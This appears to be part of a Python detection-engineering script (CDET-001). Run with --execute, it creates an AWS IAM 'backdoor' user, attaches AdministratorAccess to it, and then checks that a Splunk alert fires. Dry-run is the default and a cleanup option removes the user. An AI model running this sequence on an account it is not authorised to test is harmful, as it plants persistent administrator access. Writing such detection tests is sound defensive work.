def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="CDET-001: Simulate IAM backdoor user creation (persistence technique T1136.003)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python simulate.py --username svc-backdoor-test
  python simulate.py --username svc-backdoor-test --execute
  python simulate.py --username svc-backdoor-test --execute --cleanup
  python simulate.py --username svc-backdoor-test --execute --cleanup-only
        """,
    )
    parser.add_argument(
        "--username",
        type=str,
        default="svc-cdet001-simulation-user",
        help="IAM username to create as the backdoor (default: svc-cdet001-simulation-user)",
    )
    parser.add_argument(
        "--region",
        type=str,
        default="us-east-1",
        help="AWS region (default: us-east-1). IAM is global but region affects CloudTrail.",
    )
    parser.add_argument(
        "--execute",
        action="store_true",
        default=False,
        help="Actually execute AWS API calls. Without this flag, runs in dry-run mode.",
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        default=False,
        help="Delete the created user after simulation (requires --execute)",
    )
    parser.add_argument(
        "--cleanup-only",
        action="store_true",
        default=False,
        help="Skip simulation, only clean up a previously created test user (requires --execute)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    dry_run = not args.execute

    if dry_run:
        log.info("=" * 70)
        log.info("DRY-RUN MODE — No AWS API calls will be made")
        log.info("Pass --execute to run the simulation for real")
        log.info("=" * 70)
    else:
        log.warning("=" * 70)
        log.warning("EXECUTE MODE — Real AWS API calls WILL be made")
        log.warning("Ensure you are running in an authorized test environment")
        log.warning("=" * 70)
        time.sleep(2)  # Brief pause to allow operator to cancel (Ctrl+C)

    # Build boto3 session using default credential chain (no hardcoded creds)
    session = boto3.Session(region_name=args.region)
    iam = session.client("iam")

    # Verify identity before proceeding
    sts = session.client("sts")
    try:
        identity = sts.get_caller_identity()
        log.info(
            "Running as: %s (Account: %s)",
            identity["Arn"],
            identity["Account"],
        )
    except ClientError as exc:
        log.error("Cannot determine caller identity: %s", exc)
        return 1

    print_cloudtrail_events()

    # Cleanup-only mode
    if args.cleanup_only:
        log.info("Cleanup-only mode: removing user '%s'", args.username)
        cleanup_user(iam, args.username, dry_run)
        return 0

    # --- Simulation Phase ---
    log.info("Phase 1: Creating backdoor IAM user '%s'", args.username)
    user_arn = create_iam_user(iam, args.username, dry_run)
    if user_arn is None:
        log.error("User creation failed — aborting simulation")
        return 1

    log.info("Phase 2: Escalating privileges — attaching AdministratorAccess")
    success = attach_admin_policy(iam, args.username, dry_run)
    if not success:
        log.warning("Policy attachment failed — user may exist without privileges")

    log.info("Simulation complete.")
    log.info("Expected CDET-001 alert should fire in Splunk within ~5 minutes.")
    log.info("Verify with: index=aws_cloudtrail eventName=CreateUser requestParameters.userName=%s", args.username)

    # --- Optional Cleanup ---
    if args.cleanup:
        log.info("Cleanup requested — waiting 30 seconds for CloudTrail event propagation...")
        if not dry_run:
            time.sleep(30)
        cleanup_user(iam, args.username, dry_run)

    return 0


if __name__ == "__main__":
    sys.exit(main())
